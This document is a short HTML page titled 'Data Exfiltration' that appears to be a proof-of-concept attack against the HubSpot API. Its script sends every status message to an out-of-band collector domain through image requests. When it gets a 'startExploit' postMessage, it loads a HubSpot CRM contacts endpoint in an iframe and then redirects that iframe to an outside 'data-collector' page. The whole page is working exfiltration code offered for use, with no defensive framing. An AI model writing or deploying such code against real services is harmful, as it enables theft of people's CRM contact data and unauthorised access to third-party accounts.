<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Data Exfiltration</h1>
<div id="status"></div>
<script>
const EXFIL = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';

function log(msg) {
    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

window.addEventListener('message', function(e) {
    if (e.data && e.data.action === 'startExploit') {
        log('TRIGGERED');
        
        // Create iframe pointing to HubSpot API
        const iframe = document.createElement('iframe');
        iframe.src = 'https://api.hubapi.com/crm/v3/objects/contacts?limit=100';
        iframe.style.cssText = 'width:100%;height:400px;border:2px solid red';
        
        log('iframe_created');
        document.body.appendChild(iframe);
        
        // Wait for it to load, then try to navigate
        setTimeout(() => {
            log('navigating_iframe');
            
            try {
                // Try to navigate to our collector
                iframe.src = 'https://majdch22.github.io/data-collector.html';
                log('navigation_attempted');
            } catch(e) {
                log('error=' + e.message);
            }
        }, 5000);
    }
});

if(window.opener) {
    window.opener.postMessage({status:'ready'},'*');
}
</script>
</body>
</html>
